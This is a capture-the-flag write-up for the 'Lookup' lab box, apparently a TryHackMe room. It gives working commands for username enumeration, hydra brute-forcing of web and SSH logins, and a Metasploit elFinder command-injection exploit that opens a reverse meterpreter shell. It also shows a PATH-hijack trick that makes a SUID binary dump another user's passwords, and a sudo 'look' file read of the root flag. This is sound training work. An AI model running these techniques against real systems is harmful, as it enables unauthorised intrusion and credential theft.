**Difficulty:** Easy  
**Target IP:** 10.10.125.80

---

## 1. Reconnaissance

### `nmap` Scan

```bash
nmap -O -sV <IP_ADDRESS>
```

### Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Notes:

- SSH version is modern, likely no default creds or easy vuln—come back to this after web enumeration.
- Apache 2.4.41 might be vulnerable to certain older CVEs—add to research list.

---

## 2. Web Enumeration

**Access via hostname:**

- Target uses virtual hosts, so need to map `10.10.125.80` to `lookup.thm` in `/etc/hosts`.

- Navigating to `http://lookup.thm` presents a login portal.

### Subdomain Enumeration

```bash
gobuster dir -u http://10.10.125.80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

**Results:**

- No useful directories found.

### Username enumeration script (Python):

```python
import requests
from multiprocessing import Pool

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def user_check(name):
    data = {"username": name, "password": "password"}
    try:
        response = requests.post(target, data=data)
        if "Wrong password" in response.text:
            print(f"User found: {name}")
    except requests.RequestException as e:
        print(f"Request error for user {name}: {e}")

def main():
    with open(username_file, 'r') as f:
        users = [line.strip() for line in f]

    with Pool(processes=5) as pool:  # Limit to 5 processes at a time
        pool.map(user_check, users)

if __name__ == "__main__":
    main()
```

### Findings:

- Users found: `admin` and `jose`

---

## 3. Brute Force Login

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:Wrong" -v 
```

**Result:**

```
[80][http-post-form] host: lookup.thm   login: jose   password: [REDACTED]
```

---

## 4. Exploitation

### Initial Access

- **Target Service**: `elFinder Web File Manager v2.1.47`

### Metasploit:

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

set RHOSTS files.lookup.thm
set RPORT 80
set LHOST <your tun0 IP>         # (e.g., 10.6.X.X)
set LPORT 4444
set TARGETURI /

run
```

### Outcome:

- Payload executed, reverse `meterpreter` shell obtained.

### Shell Stabilization:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

---

## 5. Privilege Escalation

### Current User:

```bash
whoami
> www-data

id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### SUID binaries enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Notable Binaries Found:

- `/usr/sbin/pwm` (custom binary)

---

### Analyzing `/usr/sbin/pwm`

- Running `/usr/sbin/pwm` shows it looks for a `.passwords` file in the current user’s home.

- Trick `pwm` by prepending `/tmp` to `$PATH` and creating a fake `id` script in `/tmp` that spoofs user `think`.

```bash
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
chmod +x /tmp/id
/usr/sbin/pwm
```

- This dumps the contents of `/home/think/.passwords`, revealing a list of potential passwords.

---

## 6. SSH Brute Force (User: think)

Using discovered passwords from `.passwords`, brute-forced SSH for user `think` with Hydra.

### Credentials:

```
[22][ssh] host: lookup.thm   login: think   password: [REDACTED]
```

### Grab the user flag:

```bash
cat /home/think/user.txt
```

---

## 7. Sudo Privilege Escalation

### Check sudo permissions:

```bash
sudo -l
```

### Result:

```
User think may run the following commands on ip-10-10-125-80:
   (ALL) /usr/bin/look
```

### Exploit `/usr/bin/look` to read root flag:

```bash
sudo look '' /root/root.txt
```

---

## Notes:

- `$LFILE` in GTFObins examples is just a placeholder — replace it with the actual target path (e.g., `/root/root.txt`)
- Even without a full root shell, reading the root flag is enough to complete the box.
- Custom binaries with SUID should always be analyzed with `strings`, `file`, and path manipulation techniques.

---

## Lessons Learned:

- Enumeration is key — don't skip username fuzzing or assume one user is enough.
- SUID binaries may be more dangerous than they appear, especially custom ones.
- Always check what a binary depends on (`$PATH`, environment variables, etc.)

[[CTF Notes]]